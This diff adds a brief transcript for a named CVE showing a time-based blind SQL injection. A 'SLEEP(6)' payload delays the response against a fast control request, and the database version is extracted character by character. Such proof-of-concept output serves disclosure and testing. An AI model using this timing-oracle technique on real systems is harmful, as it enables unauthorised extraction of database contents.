@@ -1,0 +1,4 @@
+CVE-2026-33058 timing-oracle transcript
+control (column=id) elapsed: 0.02s
+SLEEP(6) payload elapsed: 18.01s
+version() extracted via per-char timing oracle: 10.11.
